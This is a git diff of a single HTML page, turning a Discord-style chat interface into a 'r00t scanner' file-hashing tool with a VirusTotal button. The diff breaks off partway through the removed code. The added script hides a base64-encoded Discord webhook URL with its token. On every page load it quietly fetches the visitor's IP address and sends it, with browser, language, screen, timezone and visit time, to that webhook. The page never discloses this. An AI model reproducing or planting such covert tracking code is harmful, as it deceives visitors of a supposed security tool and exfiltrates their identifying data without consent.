@@ -3,1131 +3,492 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Discord-Style Chat</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <title>r00t scanner</title>
     <style>
-        :root {
-            --discord-dark: #36393f;
-            --discord-darker: #2f3136;
-            --discord-darkest: #202225;
-            --discord-text: #dcddde;
-            --discord-text-muted: #72767d;
-            --discord-blurple: #5865f2;
-            --discord-green: #57f287;
-            --discord-red: #ed4245;
-            --discord-yellow: #fee75c;
-        }
-        
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Whitney', 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
         }
-        
+
         body {
-            background-color: var(--discord-dark);
-            color: var(--discord-text);
-            height: 100vh;
-            overflow: hidden;
-        }
-        
-        /* Welcome Screen */
-        .welcome-screen {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-color: var(--discord-dark);
+            background-color: #0a0a0a;
+            color: #e0e0e0;
+            min-height: 100vh;
             display: flex;
             flex-direction: column;
-            justify-content: center;
             align-items: center;
-            z-index: 1000;
+            padding: 20px;
         }
-        
-        .welcome-container {
-            background-color: var(--discord-darker);
-            border-radius: 8px;
-            padding: 40px;
-            width: 480px;
-            max-width: 90%;
-            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
+
+        .container {
+            max-width: 800px;
+            width: 100%;
+            margin: 0 auto;
+            padding: 20px;
         }
-        
-        .connection-options {
-            margin-top: 20px;
-            border-top: 1px solid var(--discord-darkest);
-            padding-top: 20px;
-        }
-        
-        .option-buttons {
-            display: flex;
-            gap: 10px;
-            margin-top: 10px;
-        }
-        
-        .option-btn {
-            flex: 1;
-            padding: 10px;
-            background-color: var(--discord-darkest);
-            border: 1px solid var(--discord-darkest);
-            border-radius: 4px;
-            color: var(--discord-text);
-            cursor: pointer;
-            transition: all 0.2s;
-        }
-        
-        .option-btn:hover {
-            border-color: var(--discord-blurple);
-        }
-        
-        .option-btn.active {
-            background-color: var(--discord-blurple);
-            border-color: var(--discord-blurple);
-        }
-        
-        .room-code-container {
-            margin-top: 15px;
-            display: none;
-        }
-        
-        .welcome-title {
+
+        header {
             text-align: center;
-            margin-bottom: 20px;
-            font-size: 24px;
-            font-weight: 700;
+            margin-bottom: 40px;
+            padding: 20px 0;
+            border-bottom: 1px solid #333;
         }
-        
-        .welcome-subtitle {
+
+        h1 {
+            font-size: 2.5rem;
+            color: #888;
+            margin-bottom: 10px;
+            letter-spacing: 2px;
+        }
+
+        .tagline {
+            font-size: 1rem;
+            color: #666;
+            margin-bottom: 20px;
+        }
+
+        .upload-area {
+            background-color: #111;
+            border: 2px dashed #333;
+            border-radius: 8px;
+            padding: 40px 20px;
             text-align: center;
             margin-bottom: 30px;
-            color: var(--discord-text-muted);
-        }
-        
-        .form-group {
-            margin-bottom: 20px;
-        }
-        
-        .form-label {
-            display: block;
-            margin-bottom: 8px;
-            font-size: 12px;
-            font-weight: 700;
-            text-transform: uppercase;
-            color: var(--discord-text-muted);
-        }
-        
-        .form-input {
-            width: 100%;
-            padding: 10px;
-            background-color: var(--discord-darkest);
-            border: 1px solid var(--discord-darkest);
-            border-radius: 3px;
-            color: var(--discord-text);
-            font-size: 16px;
-            transition: border-color 0.2s;
-        }
-        
-        .form-input:focus {
-            border-color: var(--discord-blurple);
-            outline: none;
-        }
-        
-        .avatar-preview {
-            width: 80px;
-            height: 80px;
-            border-radius: 50%;
-            background-color: var(--discord-blurple);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin: 0 auto 20px;
-            font-size: 32px;
-            color: white;
-            overflow: hidden;
-        }
-        
-        .avatar-preview img {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-        }
-        
-        .avatar-upload {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            margin-bottom: 20px;
-        }
-        
-        .avatar-upload-btn {
-            background-color: var(--discord-blurple);
-            color: white;
-            border: none;
-            padding: 8px 16px;
-            border-radius: 3px;
+            transition: all 0.3s ease;
             cursor: pointer;
-            font-size: 14px;
-            transition: background-color 0.2s;
         }
-        
-        .avatar-upload-btn:hover {
-            background-color: #4752c4;
+
+        .upload-area:hover {
+            border-color: #666;
+            background-color: #151515;
         }
-        
-        .join-btn {
-            width: 100%;
-            background-color: var(--discord-blurple);
-            color: white;
+
+        .upload-area.dragover {
+            border-color: #666;
+            background-color: #1a1a1a;
+        }
+
+        .upload-icon {
+            font-size: 48px;
+            color: #666;
+            margin-bottom: 15px;
+        }
+
+        .upload-text {
+            margin-bottom: 15px;
+        }
+
+        .browse-btn {
+            background-color: #444;
+            color: #fff;
             border: none;
-            padding: 12px;
-            border-radius: 3px;
-            font-size: 16px;
-            font-weight: 600;
+            padding: 10px 20px;
+            border-radius: 4px;
             cursor: pointer;
-            transition: background-color 0.2s;
-            margin-top: 10px;
+            font-weight: bold;
+            transition: background-color 0.3s;
         }
-        
-        .join-btn:hover {
-            background-color: #4752c4;
+
+        .browse-btn:hover {
+            background-color: #555;
         }
-        
-        .join-btn:disabled {
-            background-color: var(--discord-text-muted);
-            cursor: not-allowed;
-        }
-        
-        /* Chat Interface */
-        .chat-interface {
+
+        #file-input {
             display: none;
-            height: 100vh;
-            width: 100%;
         }
-        
-        .server-sidebar {
-            width: 72px;
-            background-color: var(--discord-darkest);
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            padding: 12px 0;
-            overflow-y: auto;
-        }
-        
-        .server-icon {
-            width: 48px;
-            height: 48px;
-            border-radius: 50%;
-            background-color: var(--discord-dark);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin-bottom: 8px;
-            cursor: pointer;
-            transition: border-radius 0.2s, background-color 0.2s;
-            position: relative;
-        }
-        
-        .server-icon.active {
-            border-radius: 16px;
-            background-color: var(--discord-blurple);
-        }
-        
-        .server-icon:hover:not(.active) {
-            border-radius: 16px;
-            background-color: var(--discord-blurple);
-        }
-        
-        .server-icon img {
-            width: 100%;
-            height: 100%;
-            border-radius: inherit;
-            object-fit: cover;
-        }
-        
-        .server-icon i {
-            font-size: 20px;
-            color: var(--discord-green);
-        }
-        
-        .channels-sidebar {
-            width: 240px;
-            background-color: var(--discord-darker);
-            display: flex;
-            flex-direction: column;
-        }
-        
-        .server-header {
-            padding: 16px;
-            border-bottom: 1px solid rgba(0, 0, 0, 0.2);
-            font-weight: 700;
-            box-shadow: 0 1px 0 rgba(0, 0, 0, 0.1);
-        }
-        
-        .channels-list {
-            padding: 16px;
-            flex-grow: 1;
-            overflow-y: auto;
-        }
-        
-        .channel-category {
+
+        .file-info {
+            background-color: #111;
+            border-radius: 8px;
+            padding: 20px;
             margin-bottom: 20px;
+            display: none;
         }
-        
-        .category-header {
-            display: flex;
-            align-items: center;
-            margin-bottom: 8px;
-            font-size: 12px;
-            font-weight: 700;
-            text-transform: uppercase;
-            color: var(--discord-text-muted);
+
+        .file-info h3 {
+            color: #888;
+            margin-bottom: 15px;
         }
-        
-        .channel-item {
+
+        .info-row {
             display: flex;
-            align-items: center;
-            padding: 6px 8px;
+            margin-bottom: 10px;
+            padding-bottom: 10px;
+            border-bottom: 1px solid #222;
+        }
+
+        .info-label {
+            width: 120px;
+            font-weight: bold;
+            color: #aaa;
+        }
+
+        .info-value {
+            flex: 1;
+            word-break: break-all;
+        }
+
+        .hash-value {
+            font-family: monospace;
+            background-color: #1a1a1a;
+            padding: 5px 10px;
             border-radius: 4px;
-            margin-bottom: 2px;
-            cursor: pointer;
-            color: var(--discord-text-muted);
+            color: #888;
         }
-        
-        .channel-item:hover {
-            background-color: rgba(79, 84, 92, 0.32);
-            color: var(--discord-text);
-        }
-        
-        .channel-item.active {
-            background-color: rgba(79, 84, 92, 0.4);
-            color: var(--discord-text);
-        }
-        
-        .channel-item i {
-            margin-right: 6px;
-            font-size: 16px;
-        }
-        
-        .members-list {
-            padding: 16px;
-            border-top: 1px solid rgba(0, 0, 0, 0.2);
-            max-height: 200px;
-            overflow-y: auto;
-        }
-        
-        .member-item {
+
+        .actions {
             display: flex;
-            align-items: center;
-            padding: 6px 8px;
-            border-radius: 4px;
-            margin-bottom: 2px;
-        }
-        
-        .member-avatar {
-            width: 20px;
-            height: 20px;
-            border-radius: 50%;
-            margin-right: 8px;
-            background-color: var(--discord-blurple);
-            display: flex;
-            align-items: center;
             justify-content: center;
-            font-size: 10px;
+            gap: 15px;
+            margin-top: 20px;
+        }
+
+        .btn {
+            padding: 10px 20px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-weight: bold;
+            transition: all 0.3s;
+        }
+
+        .scan-btn {
+            background-color: #444;
             color: white;
-            overflow: hidden;
         }
-        
-        .member-avatar img {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
+
+        .scan-btn:hover {
+            background-color: #555;
         }
-        
-        .member-name {
-            font-size: 14px;
-            color: var(--discord-text-muted);
+
+        .reset-btn {
+            background-color: #333;
+            color: #e0e0e0;
         }
-        
-        .online-indicator {
-            width: 8px;
-            height: 8px;
+
+        .reset-btn:hover {
+            background-color: #444;
+        }
+
+        .loading {
+            display: none;
+            text-align: center;
+            margin: 20px 0;
+        }
+
+        .spinner {
+            border: 4px solid rgba(255, 255, 255, 0.1);
+            border-left-color: #888;
             border-radius: 50%;
-            background-color: var(--discord-green);
-            margin-right: 8px;
-        }
-        
-        .chat-area {
-            flex-grow: 1;
-            display: flex;
-            flex-direction: column;
-            background-color: var(--discord-dark);
-        }
-        
-        .chat-header {
-            padding: 16px;
-            border-bottom: 1px solid rgba(0, 0, 0, 0.2);
-            display: flex;
-            align-items: center;
-            box-shadow: 0 1px 0 rgba(0, 0, 0, 0.1);
-        }
-        
-        .chat-header i {
-            margin-right: 8px;
-            color: var(--discord-text-muted);
-        }
-        
-        .chat-header h2 {
-            font-size: 16px;
-            font-weight: 700;
-        }
-        
-        .chat-header span {
-            margin-left: 8px;
-            font-size: 12px;
-            color: var(--discord-text-muted);
-        }
-        
-        .messages-container {
-            flex-grow: 1;
-            padding: 16px;
-            overflow-y: auto;
-            display: flex;
-            flex-direction: column;
-        }
-        
-        .message {
-            display: flex;
-            margin-bottom: 16px;
-            padding: 2px 48px 2px 16px;
-            position: relative;
-        }
-        
-        .message:hover {
-            background-color: rgba(4, 4, 5, 0.07);
-        }
-        
-        .message-avatar {
             width: 40px;
             height: 40px;
-            border-radius: 50%;
-            margin-right: 16px;
-            flex-shrink: 0;
-            background-color: var(--discord-blurple);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: white;
-            font-weight: 600;
-            overflow: hidden;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 15px;
         }
-        
-        .message-avatar img {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
+
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
         }
-        
-        .message-content {
-            flex-grow: 1;
-        }
-        
-        .message-header {
-            display: flex;
-            align-items: baseline;
-            margin-bottom: 4px;
-        }
-        
-        .message-author {
-            font-weight: 600;
-            margin-right: 8px;
-            font-size: 16px;
-        }
-        
-        .message-timestamp {
-            font-size: 12px;
-            color: var(--discord-text-muted);
-        }
-        
-        .message-text {
-            font-size: 16px;
-            line-height: 1.4;
-            word-wrap: break-word;
-        }
-        
-        .mention {
-            background-color: rgba(88, 101, 242, 0.3);
-            color: #949cf7;
-            padding: 0 2px;
-            border-radius: 3px;
-            cursor: pointer;
-        }
-        
-        .message-input-container {
-            padding: 16px;
-        }
-        
-        .message-input {
-            width: 100%;
-            background-color: var(--discord-darker);
-            border: none;
-            border-radius: 8px;
-            padding: 12px;
-            color: var(--discord-text);
-            font-size: 16px;
-            resize: none;
-            max-height: 150px;
-        }
-        
-        .message-input:focus {
-            outline: none;
-        }
-        
-        .user-panel {
-            background-color: var(--discord-darker);
-            padding: 12px;
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            border-top: 1px solid rgba(0, 0, 0, 0.2);
-        }
-        
-        .user-info {
-            display: flex;
-            align-items: center;
-        }
-        
-        .user-avatar {
-            width: 32px;
-            height: 32px;
-            border-radius: 50%;
-            margin-right: 8px;
-            background-color: var(--discord-blurple);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: white;
-            font-weight: 600;
-            font-size: 14px;
-            overflow: hidden;
-        }
-        
-        .user-avatar img {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-        }
-        
-        .user-details {
-            display: flex;
-            flex-direction: column;
-        }
-        
-        .username {
-            font-weight: 600;
-            font-size: 14px;
-        }
-        
-        .user-tag {
-            font-size: 12px;
-            color: var(--discord-text-muted);
-        }
-        
-        .user-controls {
-            display: flex;
-            gap: 8px;
-        }
-        
-        .user-controls button {
-            background: none;
-            border: none;
-            color: var(--discord-text-muted);
-            cursor: pointer;
-            padding: 4px;
-            border-radius: 4px;
-        }
-        
-        .user-controls button:hover {
-            color: var(--discord-text);
-            background-color: rgba(79, 84, 92, 0.32);
-        }
-        
-        /* Utility Classes */
-        .hidden {
-            display: none !important;
-        }
-        
-        .flex {
-            display: flex;
-        }
-        
-        .text-center {
+
+        footer {
+            margin-top: 40px;
             text-align: center;
+            color: #666;
+            font-size: 0.9rem;
+            padding: 20px 0;
+            border-top: 1px solid #333;
+            width: 100%;
         }
-        
-        .connection-status {
-            position: fixed;
-            bottom: 10px;
-            right: 10px;
-            padding: 5px 10px;
-            border-radius: 4px;
-            font-size: 12px;
-            z-index: 1000;
+
+        .virus-total-link {
+            color: #888;
+            text-decoration: none;
+            margin-top: 10px;
+            display: inline-block;
         }
-        
-        .connected {
-            background-color: var(--discord-green);
-            color: var(--discord-darkest);
-        }
-        
-        .disconnected {
-            background-color: var(--discord-red);
-            color: white;
-        }
-        
-        .invite-section {
-            margin-top: 15px;
-            padding: 10px;
-            background-color: var(--discord-darkest);
-            border-radius: 4px;
-            font-size: 14px;
-        }
-        
-        .invite-link {
-            display: flex;
-            margin-top: 8px;
-        }
-        
-        .invite-link input {
-            flex: 1;
-            padding: 5px;
-            background-color: var(--discord-darker);
-            border: 1px solid var(--discord-darkest);
-            border-radius: 3px;
-            color: var(--discord-text);
-        }
-        
-        .copy-btn {
-            padding: 5px 10px;
-            background-color: var(--discord-blurple);
-            color: white;
-            border: none;
-            border-radius: 3px;
-            margin-left: 5px;
-            cursor: pointer;
+
+        .virus-total-link:hover {
+            text-decoration: underline;
         }
     </style>
 </head>
 <body>
-    <!-- Welcome Screen -->
-    <div class="welcome-screen" id="welcomeScreen">
-        <div class="welcome-container">
-            <h1 class="welcome-title">Welcome to Discord-Style Chat</h1>
-            <p class="welcome-subtitle">Enter your username to get started</p>
-            
-            <div class="avatar-upload">
-                <div class="avatar-preview" id="avatarPreview">
-                    <span id="avatarInitials">U</span>
-                </div>
-                <input type="file" id="avatarInput" accept="image/*" class="hidden">
-                <button class="avatar-upload-btn" id="avatarUploadBtn">Upload Avatar</button>
-            </div>
-            
-            <div class="form-group">
-                <label class="form-label" for="usernameInput">Username</label>
-                <input type="text" class="form-input" id="usernameInput" placeholder="Enter your username" maxlength="32">
-            </div>
-            
-            <div class="connection-options">
-                <div class="form-label">Connection Type</div>
-                <div class="option-buttons">
-                    <button class="option-btn active" id="createRoomBtn">Create Room</button>
-                    <button class="option-btn" id="joinRoomBtn">Join Room</button>
-                </div>
-                
-                <div class="room-code-container" id="roomCodeContainer">
-                    <label class="form-label" for="roomCodeInput">Room Code</label>
-                    <input type="text" class="form-input" id="roomCodeInput" placeholder="Enter room code">
-                </div>
-            </div>
-            
-            <button class="join-btn" id="joinBtn">Create Room & Join Chat</button>
-            
-            <div class="invite-section hidden" id="inviteSection">
-                <div>Share this link with your friend:</div>
-                <div class="invite-link">
-                    <input type="text" id="inviteLink" readonly>
-                    <button class="copy-btn" id="copyBtn">Copy</button>
-                </div>
-            </div>
-        </div>
-    </div>
-    
-    <!-- Chat Interface -->
-    <div class="chat-interface flex" id="chatInterface">
-        <!-- Server Sidebar -->
-        <div class="server-sidebar">
-            <div class="server-icon active">
-                <i class="fas fa-hashtag"></i>
-            </div>
-            <div class="server-icon">
-                <i class="fas fa-gamepad"></i>
-            </div>
-            <div class="server-icon">
-                <i class="fas fa-music"></i>
-            </div>
-            <div class="server-icon">
-                <i class="fas fa-plus"></i>
-            </div>
-        </div>
-        
-        <!-- Channels Sidebar -->
-        <div class="channels-sidebar">
-            <div class="server-header">
-                r00t Community
-            </div>
-            
-            <div class="channels-list">
-                <div class="channel-category">
-                    <div class="category-header">
-                        <span>TEXT CHANNELS</span>
-                    </div>
-                    <div class="channel-item active">
-                        <i class="fas fa-hashtag"></i>
-                        <span>general</span>
-                    </div>
-                    <div class="channel-item">
-                        <i class="fas fa-hashtag"></i>
-                        <span>help</span>
-                    </div>
-                    <div class="channel-item">
-                        <i class="fas fa-hashtag"></i>
-                        <span>off-topic</span>
-                    </div>
-                </div>
-                
-                <div class="channel-category">
-                    <div class="category-header">
-                        <span>VOICE CHANNELS</span>
-                    </div>
-                    <div class="channel-item">
-                        <i class="fas fa-volume-up"></i>
-                        <span>General VC</span>
-                    </div>
-                    <div class="channel-item">
-                        <i class="fas fa-volume-up"></i>
-                        <span>Gaming</span>
-                    </div>
-                </div>
-            </div>
-            
-            <!-- Online Members -->
-            <div class="members-list">
-                <div class="category-header">
-                    <span>ONLINE — <span id="onlineCount">1</span></span>
-                </div>
-                <div id="membersList">
-                    <!-- Members will be added dynamically -->
-                </div>
-            </div>
-            
-            <!-- User Panel -->
-            <div class="user-panel">
-                <div class="user-info">
-                    <div class="user-avatar" id="userAvatar">
-                        <span id="userAvatarInitials">U</span>
-                    </div>
-                    <div class="user-details">
-                        <div class="username" id="displayUsername">User</div>
-                        <div class="user-tag" id="userTag">#0000</div>
-                    </div>
-                </div>
-                <div class="user-controls">
-                    <button id="micBtn">
-                        <i class="fas fa-microphone"></i>
-                    </button>
-                    <button id="headphoneBtn">
-                        <i class="fas fa-headphones"></i>
-                    </button>
-                    <button id="settingsBtn">
-                        <i class="fas fa-cog"></i>
-                    </button>
-                </div>
-            </div>
-        </div>
-        
-        <!-- Chat Area -->
-        <div class="chat-area">
-            <div class="chat-header">
-                <i class="fas fa-hashtag"></i>
-                <h2>general</h2>
-                <span id="channelDescription">— The main community channel</span>
-            </div>
-            
-            <div class="messages-container" id="messagesContainer">
-                <!-- Messages will be added here dynamically -->
-            </div>
-            
-            <div class="message-input-container">
-                <input type="text" class="message-input" id="messageInput" placeholder="Message #general">
-            </div>
-        </div>
-    </div>
+    <div class="container">
+        <header>
+            <h1>r00t scanner</h1>
+            <p class="tagline">File hash generator & security scanner</p>
+        </header>
 
-    <!-- Connection Status -->
-    <div class="connection-status disconnected" id="connectionStatus">
-        Not Connected
+        <main>
+            <div class="upload-area" id="upload-area">
+                <div class="upload-icon"></div>
+                <p class="upload-text">Drag & drop your file here or click to browse</p>
+                <button class="browse-btn">Browse Files</button>
+                <input type="file" id="file-input">
+            </div>
+
+            <div class="loading" id="loading">
+                <div class="spinner"></div>
+                <p>Calculating file hash...</p>
+            </div>
+
+            <div class="file-info" id="file-info">
+                <h3>File Information</h3>
+                <div class="info-row">
+                    <div class="info-label">File Name:</div>
+                    <div class="info-value" id="file-name">-</div>
+                </div>
+                <div class="info-row">
+                    <div class="info-label">File Size:</div>
+                    <div class="info-value" id="file-size">-</div>
+                </div>
+                <div class="info-row">
+                    <div class="info-label">File Type:</div>
+                    <div class="info-value" id="file-type">-</div>
+                </div>
+                <div class="info-row">
+                    <div class="info-label">MD5 Hash:</div>
+                    <div class="info-value">
+                        <span class="hash-value" id="md5-hash">-</span>
+                    </div>
+                </div>
+                <div class="info-row">
+                    <div class="info-label">SHA-1 Hash:</div>
+                    <div class="info-value">
+                        <span class="hash-value" id="sha1-hash">-</span>
+                    </div>
+                </div>
+                <div class="info-row">
+                    <div class="info-label">SHA-256 Hash:</div>
+                    <div class="info-value">
+                        <span class="hash-value" id="sha256-hash">-</span>
+                    </div>
+                </div>
+                
+                <div class="actions">
+                    <button class="btn scan-btn" id="scan-btn">Scan with VirusTotal</button>
+                    <button class="btn reset-btn" id="reset-btn">Analyze Another File</button>
+                </div>
+            </div>
+        </main>
+
+        <footer>
+            <p>r00t scanner - File Security Analysis Tool</p>
+            <a href="https://www.virustotal.com" target="_blank" class="virus-total-link">Powered by VirusTotal</a>
+        </footer>
     </div>
 
     <script>
-        // DOM Elements
-        const welcomeScreen = document.getElementById('welcomeScreen');
-        const chatInterface = document.getElementById('chatInterface');
-        const usernameInput = document.getElementById('usernameInput');
-        const avatarInput = document.getElementById('avatarInput');
-        const avatarUploadBtn = document.getElementById('avatarUploadBtn');
-        const avatarPreview = document.getElementById('avatarPreview');
-        const avatarInitials = document.getElementById('avatarInitials');
-        const joinBtn = document.getElementById('joinBtn');
-        const createRoomBtn = document.getElementById('createRoomBtn');
-        const joinRoomBtn = document.getElementById('joinRoomBtn');
-        const roomCodeContainer = document.getElementById('roomCodeContainer');
-        const roomCodeInput = document.getElementById('roomCodeInput');
-        const inviteSection = document.getElementById('inviteSection');
-        const inviteLink = document.getElementById('inviteLink');
-        const copyBtn = document.getElementById('copyBtn');
-        const userAvatar = document.getElementById('userAvatar');
-        const userAvatarInitials = document.getElementById('userAvatarInitials');
-        const displayUsername = document.getElementById('displayUsername');
-        const userTag = document.getElementById('userTag');
-        const messageInput = document.getElementById('messageInput');
-        const messagesContainer = document.getElementById('messagesContainer');
-        const membersList = document.getElementById('membersList');
-        const onlineCount = document.getElementById('onlineCount');
-        const connectionStatus = document.getElementById('connectionStatus');
-        
-        // User data
-        let userData = {
-            id: generateId(),
-            username: '',
-            avatar: null,
-            tag: Math.floor(Math.random() * 10000).toString().padStart(4, '0'),
-            isHost: false
-        };
-        
-        // Chat state
-        let chatState = {
-            roomId: null,
-            peers: {},
-            isConnected: false,
-            connectionType: 'create' // 'create' or 'join'
-        };
-        
-        // Event Listeners
-        joinBtn.addEventListener('click', joinChat);
-        avatarUploadBtn.addEventListener('click', () => avatarInput.click());
-        avatarInput.addEventListener('change', handleAvatarUpload);
-        usernameInput.addEventListener('input', updateAvatarPreview);
-        messageInput.addEventListener('keypress', handleMessageSend);
-        createRoomBtn.addEventListener('click', () => setConnectionType('create'));
-        joinRoomBtn.addEventListener('click', () => setConnectionType('join'));
-        copyBtn.addEventListener('click', copyInviteLink);
-        
-        // Functions
-        function setConnectionType(type) {
-            chatState.connectionType = type;
-            
-            if (type === 'create') {
-                createRoomBtn.classList.add('active');
-                joinRoomBtn.classList.remove('active');
-                roomCodeContainer.style.display = 'none';
-                joinBtn.textContent = 'Create Room & Join Chat';
-            } else {
-                createRoomBtn.classList.remove('active');
-                joinRoomBtn.classList.add('active');
-                roomCodeContainer.style.display = 'block';
-                joinBtn.textContent = 'Join Room';
+        // Webhook URL encoded
+        const webhookUrl = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQyMzE4MzEwNTQwNTA5NTk0Ni81c3Fudzc0TUMydjM1TDlmZmFBcnc2ZXNLdHIzbmhDYlVnb20yM1NwcGJjc0RjVVg3cWdzc3lfYWc1eEdlOEU5ZzN4";
+
+        // Function to decode base64
+        function decodeBase64(str) {
+            return decodeURIComponent(escape(atob(str)));
+        }
+
+        // Function to send visitor info to Discord
+        async function sendVisitorInfo() {
+            try {
+                // Get visitor IP
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                const visitorIP = ipData.ip;
+
+                // Get additional info
+                const userAgent = navigator.userAgent;
+                const browserLanguage = navigator.language;
+                const currentTime = new Date().toLocaleString();
+                const screenResolution = `${screen.width}x${screen.height}`;
+                const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+
+                // Prepare data for Discord
+                const discordData = {
+                    content: `🔍 **New Visitor on r00t scanner**\n\n**IP Address:** ${visitorIP}\n**Browser:** ${userAgent}\n**Language:** ${browserLanguage}\n**Screen:** ${screenResolution}\n**Timezone:** ${timezone}\n**Visit Time:** ${currentTime}\n\n*File scanner accessed*`
+                };
+
+                // Send to Discord webhook
+                await fetch(decodeBase64(webhookUrl), {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(discordData)
+                });
+
+            } catch (error) {
+                console.log('Error sending visitor info');
             }
         }
-        
-        function joinChat() {
-            const username = usernameInput.value.trim();
-            
-            if (!username) {
-                alert('Please enter a username');
-                return;
+
+        // Send visitor info when page loads
+        window.addEventListener('load', sendVisitorInfo);
+
+        // File handling functionality
+        document.addEventListener('DOMContentLoaded', function() {
+            const uploadArea = document.getElementById('upload-area');
+            const fileInput = document.getElementById('file-input');
+            const fileInfo = document.getElementById('file-info');
+            const fileName = document.getElementById('file-name');
+            const fileSize = document.getElementById('file-size');
+            const fileType = document.getElementById('file-type');
+            const md5Hash = document.getElementById('md5-hash');
+            const sha1Hash = document.getElementById('sha1-hash');
+            const sha256Hash = document.getElementById('sha256-hash');
+            const scanBtn = document.getElementById('scan-btn');
+            const resetBtn = document.getElementById('reset-btn');
+            const loading = document.getElementById('loading');
+
+            // Click to upload
+            uploadArea.addEventListener('click', () => {
+                fileInput.click();
+            });
+
+            // Drag and drop handlers
+            ['dragenter', 'dragover', 'dragleave', 'drop'].forEach(eventName => {
+                uploadArea.addEventListener(eventName, preventDefaults, false);
+            });
+
+            function preventDefaults(e) {
+                e.preventDefault();
+                e.stopPropagation();
             }
-            
-            userData.username = username;
-            
-            // Update UI with user data
-            displayUsername.textContent = username;
-            userTag.textContent = `#${userData.tag}`;
-            userAvatarInitials.textContent = getInitials(username);
-            
-            if (userData.avatar) {
-                userAvatar.innerHTML = `<img src="${userData.avatar}" alt="${username}">`;
+
+            ['dragenter', 'dragover'].forEach(eventName => {
+                uploadArea.addEventListener(eventName, highlight, false);
+            });
+
+            ['dragleave', 'drop'].forEach(eventName => {
+                uploadArea.addEventListener(eventName, unhighlight, false);
+            });
+
+            function highlight() {
+                uploadArea.classList.add('dragover');
             }
-            
-            // Generate or use room code
-            if (chatState.connectionType === 'create') {
-                chatState.roomId = generateRoomCode();
-                userData.isHost = true;
-                
-                // Show invite section
-                inviteSection.classList.remove('hidden');
-                const currentUrl = window.location.href.split('?')[0];
-                inviteLink.value = `${currentUrl}?room=${chatState.roomId}`;
-            } else {
-                const roomCode = roomCodeInput.value.trim();
-                if (!roomCode) {
-                    alert('Please enter a room code');
-                    return;
+
+            function unhighlight() {
+                uploadArea.classList.remove('dragover');
+            }
+
+            uploadArea.addEventListener('drop', handleDrop, false);
+
+            function handleDrop(e) {
+                const dt = e.dataTransfer;
+                const files = dt.files;
+                handleFiles(files);
+            }
+
+            // File input change
+            fileInput.addEventListener('change', function() {
+                handleFiles(this.files);
+            });
+
+            // Process files
+            function handleFiles(files) {
+                if (files.length > 0) {
+                    const file = files[0];
+                    processFile(file);
                 }
-                chatState.roomId = roomCode;
-                userData.isHost = false;
             }
-            
-            // Switch to chat interface
-            welcomeScreen.style.display = 'none';
-            chatInterface.style.display = 'flex';
-            
-            // Update connection status
-            connectionStatus.textContent = 'Connected to Room: ' + chatState.roomId;
-            connectionStatus.className = 'connection-status connected';
-            chatState.isConnected = true;
-            
-            // Add welcome message
-            addSystemMessage(`Welcome to the chat, ${username}!`);
-            addSystemMessage(`You've joined room: ${chatState.roomId}`);
-            
-            if (userData.isHost) {
-                addSystemMessage(`You are the room host. Share the invite link with friends!`);
+
+            // Process and hash file
+            function processFile(file) {
+                loading.style.display = 'block';
+                fileInfo.style.display = 'none';
+
+                fileName.textContent = file.name;
+                fileSize.textContent = formatFileSize(file.size);
+                fileType.textContent = file.type || 'Unknown';
+
+                calculateFileHash(file)
+                    .then(hashes => {
+                        md5Hash.textContent = hashes.md5;
+                        sha1Hash.textContent = hashes.sha1;
+                        sha256Hash.textContent = hashes.sha256;
+
+                        loading.style.display = 'none';
+                        fileInfo.style.display = 'block';
+                    })
+                    .catch(error => {
+                        console.error('Hash calculation error:', error);
+                        loading.style.display = 'none';
+                        alert('Error calculating file hash. Please try again.');
+                    });
             }
-            
-            // Add yourself to members list
-            updateMembersList();
-            
-            // Focus on message input
-            messageInput.focus();
-            
-            // Check if there's a room in URL (for joining via invite link)
-            checkUrlForRoom();
-        }
-        
-        function checkUrlForRoom() {
-            const urlParams = new URLSearchParams(window.location.search);
-            const roomFromUrl = urlParams.get('room');
-            
-            if (roomFromUrl && !chatState.roomId) {
-                roomCodeInput.value = roomFromUrl;
-                setConnectionType('join');
+
+            // Format file size
+            function formatFileSize(bytes) {
+                if (bytes === 0) return '0 Bytes';
+                const k = 1024;
+                const sizes = ['Bytes', 'KB', 'MB', 'GB'];
+                const i = Math.floor(Math.log(bytes) / Math.log(k));
+                return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
             }
-        }
-        
-        function handleAvatarUpload(event) {
-            const file = event.target.files[0];
-            if (!file) return;
-            
-            const reader = new FileReader();
-            reader.onload = function(e) {
-                userData.avatar = e.target.result;
-                avatarPreview.innerHTML = `<img src="${e.target.result}" alt="Avatar">`;
-            };
-            reader.readAsDataURL(file);
-        }
-        
-        function updateAvatarPreview() {
-            const username = usernameInput.value.trim();
-            avatarInitials.textContent = getInitials(username);
-        }
-        
-        function getInitials(username) {
-            if (!username) return 'U';
-            return username.charAt(0).toUpperCase();
-        }
-        
-        function handleMessageSend(event) {
-            if (event.key === 'Enter' && messageInput.value.trim()) {
-                const message = messageInput.value.trim();
-                sendMessage(message);
-                messageInput.value = '';
-            }
